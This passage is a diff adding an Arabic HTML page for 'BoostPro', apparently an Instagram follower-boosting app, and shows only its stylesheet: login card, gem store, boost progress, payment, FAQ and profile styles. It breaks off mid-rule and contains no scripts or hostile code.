@@ -1,0 +1,3451 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BoostPro - زيادة متابعين انستقرام</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+:root {
+  --primary: #6C63FF;
+  --primary-dark: #5A52D5;
+  --secondary: #FF6B6B;
+  --accent: #4ECDC4;
+  --gold: #FFD93D;
+  --dark: #0a0a1a;
+  --darker: #060612;
+  --card-bg: rgba(255,255,255,0.04);
+  --glass: rgba(255,255,255,0.06);
+  --text: #e0e0e0;
+  --text-dim: #888;
+  --success: #00C853;
+  --warning: #FF9100;
+  --danger: #FF1744;
+  --gradient-1: linear-gradient(135deg, #6C63FF, #4ECDC4);
+  --gradient-2: linear-gradient(135deg, #FF6B6B, #FFD93D);
+  --gradient-3: linear-gradient(135deg, #6C63FF, #FF6B6B);
+  --gradient-instagram: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+}
+
+body {
+  font-family: 'Tajawal', sans-serif;
+  background: var(--dark);
+  color: var(--text);
+  overflow-x: hidden;
+  min-height: 100vh;
+}
+
+/* Animated Background */
+.bg-animation {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;  height: 100%;
+  z-index: 0;
+  overflow: hidden;
+}
+
+.bg-animation .orb {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(80px);
+  opacity: 0.15;
+  animation: floatOrb 20s infinite ease-in-out;
+}
+
+.orb:nth-child(1) {
+  width: 400px;
+  height: 400px;
+  background: var(--primary);
+  top: -100px;
+  right: -100px;
+  animation-delay: 0s;
+}
+
+.orb:nth-child(2) {
+  width: 300px;
+  height: 300px;
+  background: var(--secondary);
+  bottom: -50px;
+  left: -50px;
+  animation-delay: -5s;
+}
+
+.orb:nth-child(3) {
+  width: 350px;
+  height: 350px;
+  background: var(--accent);
+  top: 50%;
+  left: 50%;
+  animation-delay: -10s;
+}
+
+.orb:nth-child(4) {
+  width: 250px;
+  height: 250px;
+  background: var(--gold);
+  top: 30%;
+  right: 20%;
+  animation-delay: -15s;
+}
+
+@keyframes floatOrb {  0%, 100% { transform: translate(0, 0) scale(1); }
+  25% { transform: translate(50px, -80px) scale(1.1); }
+  50% { transform: translate(-30px, 50px) scale(0.9); }
+  75% { transform: translate(80px, 30px) scale(1.05); }
+}
+
+/* Particles */
+.particles {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+.particle {
+  position: absolute;
+  width: 3px;
+  height: 3px;
+  background: var(--primary);
+  border-radius: 50%;
+  animation: particleFloat linear infinite;
+  opacity: 0;
+}
+
+@keyframes particleFloat {
+  0% { opacity: 0; transform: translateY(100vh) scale(0); }
+  10% { opacity: 0.6; }
+  90% { opacity: 0.6; }
+  100% { opacity: 0; transform: translateY(-10vh) scale(1); }
+}
+
+/* Grid Lines */
+.grid-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+  background-image: 
+    linear-gradient(rgba(108,99,255,0.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(108,99,255,0.03) 1px, transparent 1px);
+  background-size: 50px 50px;
+  pointer-events: none;
+}
+
+/* Loading Screen */.loading-screen {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: var(--darker);
+  z-index: 10000;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  transition: opacity 0.8s, visibility 0.8s;
+}
+
+.loading-screen.hidden {
+  opacity: 0;
+  visibility: hidden;
+}
+
+.loader-logo {
+  font-size: 3rem;
+  font-weight: 900;
+  background: var(--gradient-1);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 30px;
+  animation: pulse 2s infinite;
+}
+
+.loader-bar-container {
+  width: 200px;
+  height: 4px;
+  background: rgba(255,255,255,0.1);
+  border-radius: 2px;
+  overflow: hidden;
+}
+
+.loader-bar {
+  height: 100%;
+  background: var(--gradient-1);
+  border-radius: 2px;
+  animation: loadBar 2s ease-in-out forwards;
+}
+
+@keyframes loadBar {
+  0% { width: 0%; }
+  100% { width: 100%; }
+}
+.loader-text {
+  margin-top: 15px;
+  color: var(--text-dim);
+  font-size: 0.85rem;
+  animation: blink 1.5s infinite;
+}
+
+@keyframes blink {
+  0%, 100% { opacity: 0.4; }
+  50% { opacity: 1; }
+}
+
+/* Login Page */
+.login-page {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 1000;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.login-container {
+  width: 100%;
+  max-width: 420px;
+  animation: slideUp 0.8s ease-out;
+}
+
+@keyframes slideUp {
+  from { opacity: 0; transform: translateY(40px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.login-card {
+  background: var(--glass);
+  backdrop-filter: blur(20px);
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 24px;
+  padding: 40px 35px;
+  position: relative;
+  overflow: hidden;
+}
+
+.login-card::before {
+  content: '';  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 3px;
+  background: var(--gradient-instagram);
+}
+
+.login-header {
+  text-align: center;
+  margin-bottom: 35px;
+}
+
+.login-logo {
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 20px;
+  background: var(--gradient-instagram);
+  border-radius: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2rem;
+  color: white;
+  font-weight: 900;
+  position: relative;
+  animation: glowPulse 3s infinite;
+}
+
+@keyframes glowPulse {
+  0%, 100% { box-shadow: 0 0 20px rgba(225,48,108,0.3); }
+  50% { box-shadow: 0 0 40px rgba(225,48,108,0.6); }
+}
+
+.login-logo svg {
+  width: 40px;
+  height: 40px;
+  fill: white;
+}
+
+.login-title {
+  font-size: 1.6rem;
+  font-weight: 800;
+  margin-bottom: 8px;
+  background: var(--gradient-1);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.login-subtitle {
+  color: var(--text-dim);
+  font-size: 0.9rem;
+}
+
+.login-form .input-group {
+  margin-bottom: 20px;
+  position: relative;
+}
+
+.input-group label {
+  display: block;
+  margin-bottom: 8px;
+  font-size: 0.85rem;
+  color: var(--text-dim);
+  font-weight: 500;
+}
+
+.input-group input {
+  width: 100%;
+  padding: 14px 18px;
+  padding-right: 45px;
+  background: rgba(255,255,255,0.05);
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 14px;
+  color: white;
+  font-size: 0.95rem;
+  font-family: 'Tajawal', sans-serif;
+  transition: all 0.3s;
+  outline: none;
+}
+
+.input-group input:focus {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px rgba(108,99,255,0.15);
+  background: rgba(255,255,255,0.08);
+}
+
+.input-icon {
+  position: absolute;
+  left: 15px;
+  top: 42px;
+  color: var(--text-dim);
+  font-size: 1.1rem;
+  transition: color 0.3s;
+}
+
+.input-group input:focus ~ .input-icon {
+  color: var(--primary);
+}
+.login-btn {
+  width: 100%;
+  padding: 15px;
+  background: var(--gradient-instagram);
+  border: none;
+  border-radius: 14px;
+  color: white;
+  font-size: 1rem;
+  font-weight: 700;
+  font-family: 'Tajawal', sans-serif;
+  cursor: pointer;
+  transition: all 0.3s;
+  position: relative;
+  overflow: hidden;
+  margin-top: 10px;
+}
+
+.login-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px rgba(225,48,108,0.4);
+}
+
+.login-btn:active {
+  transform: translateY(0);
+}
+
+.login-btn .btn-shine {
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+  animation: btnShine 3s infinite;
+}
+
+@keyframes btnShine {
+  0% { left: -100%; }
+  50%, 100% { left: 100%; }
+}
+
+.login-footer {
+  text-align: center;
+  margin-top: 25px;
+  padding-top: 20px;
+  border-top: 1px solid rgba(255,255,255,0.06);
+}
+
+.login-footer p {  font-size: 0.8rem;
+  color: var(--text-dim);
+}
+
+.login-footer .badge {
+  display: inline-block;
+  padding: 4px 12px;
+  background: rgba(0,200,83,0.15);
+  color: var(--success);
+  border-radius: 20px;
+  font-size: 0.75rem;
+  margin-top: 8px;
+  border: 1px solid rgba(0,200,83,0.2);
+}
+
+/* Welcome Modal */
+.modal-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.7);
+  backdrop-filter: blur(10px);
+  z-index: 5000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.modal-overlay.active {
+  display: flex;
+  animation: fadeIn 0.3s ease;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+.modal-content {
+  background: linear-gradient(145deg, #1a1a2e, #16213e);
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 24px;
+  padding: 40px 30px;
+  max-width: 400px;
+  width: 100%;
+  text-align: center;
+  position: relative;  animation: modalPop 0.5s ease;
+}
+
+@keyframes modalPop {
+  from { transform: scale(0.8); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+
+.modal-content .gift-icon {
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 20px;
+  background: var(--gradient-2);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2.5rem;
+  animation: bounce 2s infinite;
+}
+
+@keyframes bounce {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-15px); }
+}
+
+.modal-content h2 {
+  font-size: 1.5rem;
+  margin-bottom: 10px;
+  color: white;
+}
+
+.modal-content p {
+  color: var(--text-dim);
+  margin-bottom: 20px;
+  line-height: 1.6;
+}
+
+.modal-content .gem-amount {
+  font-size: 2.5rem;
+  font-weight: 900;
+  background: var(--gradient-2);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin: 15px 0;
+}
+
+.modal-btn {
+  padding: 12px 40px;  background: var(--gradient-1);
+  border: none;
+  border-radius: 12px;
+  color: white;
+  font-size: 1rem;
+  font-weight: 700;
+  font-family: 'Tajawal', sans-serif;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.modal-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 5px 20px rgba(108,99,255,0.4);
+}
+
+/* Main App */
+.app-container {
+  display: none;
+  position: relative;
+  z-index: 1;
+}
+
+.app-container.active {
+  display: block;
+}
+
+/* Top Navigation */
+.top-nav {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 65px;
+  background: rgba(10,10,26,0.9);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid rgba(255,255,255,0.06);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 20px;
+  z-index: 100;
+}
+
+.nav-brand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.nav-brand-icon {
+  width: 36px;
+  height: 36px;
+  background: var(--gradient-instagram);
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: 900;
+  color: white;
+  font-size: 0.9rem;
+}
+
+.nav-brand-text {
+  font-weight: 800;
+  font-size: 1.1rem;
+  background: var(--gradient-1);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.nav-gems {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 16px;
+  background: rgba(255,215,61,0.1);
+  border: 1px solid rgba(255,215,61,0.2);
+  border-radius: 25px;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.nav-gems:hover {
+  background: rgba(255,215,61,0.2);
+}
+
+.gem-icon {
+  font-size: 1.1rem;
+}
+
+.gem-count {
+  font-weight: 700;
+  color: var(--gold);
+  font-size: 0.95rem;
+}
+
+.nav-user {
+  display: flex;  align-items: center;
+  gap: 10px;
+  cursor: pointer;
+  padding: 5px 12px;
+  border-radius: 12px;
+  transition: background 0.3s;
+}
+
+.nav-user:hover {
+  background: rgba(255,255,255,0.05);
+}
+
+.user-avatar {
+  width: 32px;
+  height: 32px;
+  background: var(--gradient-3);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: 700;
+  font-size: 0.8rem;
+  color: white;
+}
+
+/* Bottom Navigation */
+.bottom-nav {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  height: 70px;
+  background: rgba(10,10,26,0.95);
+  backdrop-filter: blur(20px);
+  border-top: 1px solid rgba(255,255,255,0.06);
+  display: flex;
+  align-items: center;
+  justify-content: space-around;
+  z-index: 100;
+  padding: 0 10px;
+}
+
+.nav-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 4px;
+  padding: 8px 15px;
+  border-radius: 12px;
+  cursor: pointer;  transition: all 0.3s;
+  position: relative;
+}
+
+.nav-item.active {
+  color: var(--primary);
+}
+
+.nav-item.active::before {
+  content: '';
+  position: absolute;
+  top: -1px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 30px;
+  height: 3px;
+  background: var(--primary);
+  border-radius: 0 0 3px 3px;
+}
+
+.nav-item-icon {
+  font-size: 1.3rem;
+  opacity: 0.5;
+  transition: all 0.3s;
+}
+
+.nav-item.active .nav-item-icon {
+  opacity: 1;
+}
+
+.nav-item-text {
+  font-size: 0.7rem;
+  font-weight: 500;
+  opacity: 0.5;
+  transition: all 0.3s;
+}
+
+.nav-item.active .nav-item-text {
+  opacity: 1;
+  color: var(--primary);
+}
+
+.nav-item-badge {
+  position: absolute;
+  top: 2px;
+  right: 8px;
+  width: 8px;
+  height: 8px;
+  background: var(--danger);
+  border-radius: 50%;  animation: pulse 2s infinite;
+}
+
+/* Pages */
+.page {
+  display: none;
+  padding: 85px 20px 90px;
+  min-height: 100vh;
+  animation: pageIn 0.4s ease;
+}
+
+.page.active {
+  display: block;
+}
+
+@keyframes pageIn {
+  from { opacity: 0; transform: translateX(20px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+
+/* Dashboard Page */
+.welcome-section {
+  margin-bottom: 30px;
+}
+
+.welcome-section h1 {
+  font-size: 1.5rem;
+  font-weight: 800;
+  margin-bottom: 5px;
+}
+
+.welcome-section p {
+  color: var(--text-dim);
+  font-size: 0.9rem;
+}
+
+/* Stats Cards */
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 12px;
+  margin-bottom: 25px;
+}
+
+.stat-card {
+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 18px;
+  padding: 20px 15px;
+  position: relative;  overflow: hidden;
+  transition: all 0.3s;
+}
+
+.stat-card:hover {
+  transform: translateY(-3px);
+  border-color: rgba(108,99,255,0.2);
+}
+
+.stat-card::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  filter: blur(30px);
+  opacity: 0.15;
+}
+
+.stat-card:nth-child(1)::after { background: var(--primary); }
+.stat-card:nth-child(2)::after { background: var(--gold); }
+.stat-card:nth-child(3)::after { background: var(--accent); }
+.stat-card:nth-child(4)::after { background: var(--secondary); }
+
+.stat-icon {
+  width: 40px;
+  height: 40px;
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.2rem;
+  margin-bottom: 12px;
+}
+
+.stat-card:nth-child(1) .stat-icon { background: rgba(108,99,255,0.15); color: var(--primary); }
+.stat-card:nth-child(2) .stat-icon { background: rgba(255,215,61,0.15); color: var(--gold); }
+.stat-card:nth-child(3) .stat-icon { background: rgba(78,205,196,0.15); color: var(--accent); }
+.stat-card:nth-child(4) .stat-icon { background: rgba(255,107,107,0.15); color: var(--secondary); }
+
+.stat-value {
+  font-size: 1.5rem;
+  font-weight: 800;
+  color: white;
+  margin-bottom: 4px;
+}
+
+.stat-label {  font-size: 0.75rem;
+  color: var(--text-dim);
+}
+
+/* Quick Actions */
+.section-title {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin-bottom: 15px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.section-title span {
+  background: var(--gradient-1);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.quick-actions {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 12px;
+  margin-bottom: 25px;
+}
+
+.action-card {
+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 16px;
+  padding: 20px 10px;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.3s;
+  position: relative;
+  overflow: hidden;
+}
+
+.action-card:hover {
+  transform: translateY(-5px);
+  border-color: rgba(108,99,255,0.3);
+  box-shadow: 0 10px 30px rgba(108,99,255,0.1);
+}
+
+.action-card::before {
+  content: '';
+  position: absolute;
+  top: 0;  left: 0;
+  right: 0;
+  height: 3px;
+  background: var(--gradient-1);
+  opacity: 0;
+  transition: opacity 0.3s;
+}
+
+.action-card:hover::before {
+  opacity: 1;
+}
+
+.action-icon {
+  width: 50px;
+  height: 50px;
+  margin: 0 auto 10px;
+  border-radius: 15px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.5rem;
+  transition: transform 0.3s;
+}
+
+.action-card:hover .action-icon {
+  transform: scale(1.1);
+}
+
+.action-icon.purple { background: rgba(108,99,255,0.15); }
+.action-icon.gold { background: rgba(255,215,61,0.15); }
+.action-icon.teal { background: rgba(78,205,196,0.15); }
+
+.action-label {
+  font-size: 0.8rem;
+  font-weight: 600;
+  color: var(--text);
+}
+
+/* Tips Section */
+.tips-section {
+  margin-bottom: 25px;
+}
+
+.tip-card {
+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 16px;
+  padding: 18px;
+  display: flex;
+  align-items: flex-start;  gap: 12px;
+  margin-bottom: 10px;
+  transition: all 0.3s;
+  cursor: pointer;
+}
+
+.tip-card:hover {
+  background: rgba(255,255,255,0.06);
+  transform: translateX(-5px);
+}
+
+.tip-icon {
+  width: 36px;
+  height: 36px;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1rem;
+  flex-shrink: 0;
+  background: rgba(108,99,255,0.15);
+  color: var(--primary);
+}
+
+.tip-content h4 {
+  font-size: 0.85rem;
+  font-weight: 700;
+  margin-bottom: 4px;
+  color: white;
+}
+
+.tip-content p {
+  font-size: 0.75rem;
+  color: var(--text-dim);
+  line-height: 1.5;
+}
+
+/* Boost Page */
+.boost-page {
+  max-width: 500px;
+  margin: 0 auto;
+}
+
+.boost-card {
+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 20px;
+  padding: 25px;
+  margin-bottom: 20px;
+  position: relative;  overflow: hidden;
+}
+
+.boost-card::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 3px;
+  background: var(--gradient-instagram);
+}
+
+.boost-input-group {
+  margin-bottom: 20px;
+}
+
+.boost-input-group label {
+  display: block;
+  margin-bottom: 8px;
+  font-size: 0.85rem;
+  font-weight: 600;
+  color: var(--text);
+}
+
+.boost-input {
+  width: 100%;
+  padding: 14px 18px;
+  background: rgba(255,255,255,0.05);
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 14px;
+  color: white;
+  font-size: 0.95rem;
+  font-family: 'Tajawal', sans-serif;
+  outline: none;
+  transition: all 0.3s;
+}
+
+.boost-input:focus {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 3px rgba(108,99,255,0.15);
+}
+
+.boost-input::placeholder {
+  color: var(--text-dim);
+}
+
+/* Gem Selector */
+.gem-selector {
+  margin-bottom: 20px;}
+
+.gem-selector label {
+  display: block;
+  margin-bottom: 10px;
+  font-size: 0.85rem;
+  font-weight: 600;
+}
+
+.gem-options {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+}
+
+.gem-option {
+  background: rgba(255,255,255,0.05);
+  border: 2px solid rgba(255,255,255,0.08);
+  border-radius: 14px;
+  padding: 15px 10px;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.3s;
+  position: relative;
+}
+
+.gem-option:hover {
+  border-color: rgba(255,215,61,0.3);
+  background: rgba(255,215,61,0.05);
+}
+
+.gem-option.selected {
+  border-color: var(--gold);
+  background: rgba(255,215,61,0.1);
+  box-shadow: 0 0 20px rgba(255,215,61,0.1);
+}
+
+.gem-option.selected::after {
+  content: '';
+  position: absolute;
+  top: -1px;
+  left: -1px;
+  right: -1px;
+  bottom: -1px;
+  border-radius: 14px;
+  border: 2px solid var(--gold);
+  animation: selectPulse 2s infinite;
+}
+
+@keyframes selectPulse {  0%, 100% { opacity: 1; }
+  50% { opacity: 0.5; }
+}
+
+.gem-option-value {
+  font-size: 1.3rem;
+  font-weight: 800;
+  color: var(--gold);
+  margin-bottom: 4px;
+}
+
+.gem-option-label {
+  font-size: 0.7rem;
+  color: var(--text-dim);
+}
+
+.gem-option-price {
+  font-size: 0.7rem;
+  color: var(--accent);
+  margin-top: 4px;
+}
+
+/* Boost Button */
+.boost-btn {
+  width: 100%;
+  padding: 16px;
+  background: var(--gradient-instagram);
+  border: none;
+  border-radius: 14px;
+  color: white;
+  font-size: 1.05rem;
+  font-weight: 700;
+  font-family: 'Tajawal', sans-serif;
+  cursor: pointer;
+  transition: all 0.3s;
+  position: relative;
+  overflow: hidden;
+}
+
+.boost-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px rgba(225,48,108,0.4);
+}
+
+.boost-btn:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
+.boost-btn .btn-shine {
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+  animation: btnShine 3s infinite;
+}
+
+/* Progress */
+.boost-progress {
+  display: none;
+  margin-top: 25px;
+  text-align: center;
+}
+
+.boost-progress.active {
+  display: block;
+  animation: fadeIn 0.5s;
+}
+
+.progress-ring {
+  width: 120px;
+  height: 120px;
+  margin: 0 auto 20px;
+  position: relative;
+}
+
+.progress-ring svg {
+  transform: rotate(-90deg);
+  width: 120px;
+  height: 120px;
+}
+
+.progress-ring circle {
+  fill: none;
+  stroke-width: 6;
+}
+
+.progress-ring .bg {
+  stroke: rgba(255,255,255,0.1);
+}
+
+.progress-ring .progress {
+  stroke: url(#progressGradient);
+  stroke-linecap: round;
+  stroke-dasharray: 339.292;
+  stroke-dashoffset: 339.292;  transition: stroke-dashoffset 0.5s;
+}
+
+.progress-ring .percentage {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 1.8rem;
+  font-weight: 800;
+  color: white;
+}
+
+.progress-status {
+  font-size: 0.9rem;
+  color: var(--text-dim);
+  margin-bottom: 10px;
+}
+
+.progress-detail {
+  font-size: 0.8rem;
+  color: var(--text-dim);
+  line-height: 1.6;
+}
+
+/* Store Page */
+.store-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 15px;
+  margin-bottom: 25px;
+}
+
+.store-card {
+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 18px;
+  padding: 20px 15px;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+  transition: all 0.3s;
+  cursor: pointer;
+}
+
+.store-card:hover {
+  transform: translateY(-5px);
+  border-color: rgba(108,99,255,0.3);
+}
+.store-card.featured {
+  border-color: rgba(255,215,61,0.3);
+  background: rgba(255,215,61,0.05);
+}
+
+.store-card.featured::before {
+  content: 'الاكثر طلبا';
+  position: absolute;
+  top: 12px;
+  left: -25px;
+  background: var(--gradient-2);
+  color: white;
+  font-size: 0.6rem;
+  font-weight: 700;
+  padding: 3px 30px;
+  transform: rotate(45deg);
+}
+
+.store-icon {
+  width: 60px;
+  height: 60px;
+  margin: 0 auto 12px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.8rem;
+  position: relative;
+}
+
+.store-icon::after {
+  content: '';
+  position: absolute;
+  width: 70px;
+  height: 70px;
+  border-radius: 50%;
+  border: 2px dashed rgba(255,215,61,0.2);
+  animation: rotate 10s linear infinite;
+}
+
+@keyframes rotate {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+
+.store-amount {
+  font-size: 1.4rem;
+  font-weight: 800;
+  color: var(--gold);
+  margin-bottom: 4px;}
+
+.store-bonus {
+  font-size: 0.7rem;
+  color: var(--accent);
+  margin-bottom: 8px;
+}
+
+.store-price {
+  font-size: 1rem;
+  font-weight: 700;
+  color: white;
+  margin-bottom: 12px;
+}
+
+.store-buy-btn {
+  width: 100%;
+  padding: 10px;
+  background: var(--gradient-1);
+  border: none;
+  border-radius: 10px;
+  color: white;
+  font-size: 0.85rem;
+  font-weight: 700;
+  font-family: 'Tajawal', sans-serif;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.store-buy-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 5px 15px rgba(108,99,255,0.3);
+}
+
+/* Payment Methods */
+.payment-section {
+  margin-top: 25px;
+}
+
+.payment-methods {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.payment-method {
+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 14px;
+  padding: 15px 18px;  display: flex;
+  align-items: center;
+  gap: 12px;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.payment-method:hover {
+  border-color: rgba(108,99,255,0.3);
+  background: rgba(255,255,255,0.06);
+}
+
+.payment-method.selected {
+  border-color: var(--primary);
+  background: rgba(108,99,255,0.1);
+}
+
+.payment-icon {
+  width: 40px;
+  height: 40px;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.2rem;
+  flex-shrink: 0;
+}
+
+.payment-info h4 {
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: white;
+  margin-bottom: 2px;
+}
+
+.payment-info p {
+  font-size: 0.7rem;
+  color: var(--text-dim);
+}
+
+/* Support Page */
+.support-section {
+  margin-bottom: 25px;
+}
+
+.faq-item {
+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 14px;
+  margin-bottom: 10px;  overflow: hidden;
+  transition: all 0.3s;
+}
+
+.faq-item:hover {
+  border-color: rgba(108,99,255,0.2);
+}
+
+.faq-question {
+  padding: 16px 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  font-weight: 600;
+  font-size: 0.9rem;
+  transition: all 0.3s;
+}
+
+.faq-question:hover {
+  background: rgba(255,255,255,0.03);
+}
+
+.faq-arrow {
+  transition: transform 0.3s;
+  color: var(--primary);
+}
+
+.faq-item.open .faq-arrow {
+  transform: rotate(180deg);
+}
+
+.faq-answer {
+  max-height: 0;
+  overflow: hidden;
+  transition: max-height 0.3s ease;
+}
+
+.faq-item.open .faq-answer {
+  max-height: 200px;
+}
+
+.faq-answer p {
+  padding: 0 18px 16px;
+  font-size: 0.8rem;
+  color: var(--text-dim);
+  line-height: 1.6;
+}
+
+.contact-card {  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 16px;
+  padding: 20px;
+  text-align: center;
+}
+
+.contact-card h3 {
+  font-size: 1rem;
+  font-weight: 700;
+  margin-bottom: 10px;
+}
+
+.contact-card p {
+  font-size: 0.8rem;
+  color: var(--text-dim);
+  margin-bottom: 15px;
+}
+
+.contact-btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 25px;
+  background: var(--gradient-1);
+  border: none;
+  border-radius: 10px;
+  color: white;
+  font-size: 0.85rem;
+  font-weight: 700;
+  font-family: 'Tajawal', sans-serif;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.contact-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 5px 15px rgba(108,99,255,0.3);
+}
+
+/* Profile Page */
+.profile-header {
+  text-align: center;
+  margin-bottom: 25px;
+}
+
+.profile-avatar {
+  width: 90px;
+  height: 90px;
+  margin: 0 auto 15px;  background: var(--gradient-3);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2rem;
+  font-weight: 800;
+  color: white;
+  position: relative;
+}
+
+.profile-avatar::after {
+  content: '';
+  position: absolute;
+  inset: -4px;
+  border-radius: 50%;
+  border: 2px solid rgba(108,99,255,0.3);
+  animation: pulse 2s infinite;
+}
+
+.profile-name {
+  font-size: 1.3rem;
+  font-weight: 800;
+  margin-bottom: 4px;
+}
+
+.profile-username {
+  color: var(--text-dim);
+  font-size: 0.85rem;
+}
+
+.profile-stats {
+  display: flex;
+  justify-content: center;
+  gap: 30px;
+  margin-top: 20px;
+}
+
+.profile-stat {
+  text-align: center;
+}
+
+.profile-stat-value {
+  font-size: 1.2rem;
+  font-weight: 800;
+  color: white;
+}
+
+.profile-stat-label {
+  font-size: 0.7rem;  color: var(--text-dim);
+}
+
+.profile-menu {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.profile-menu-item {
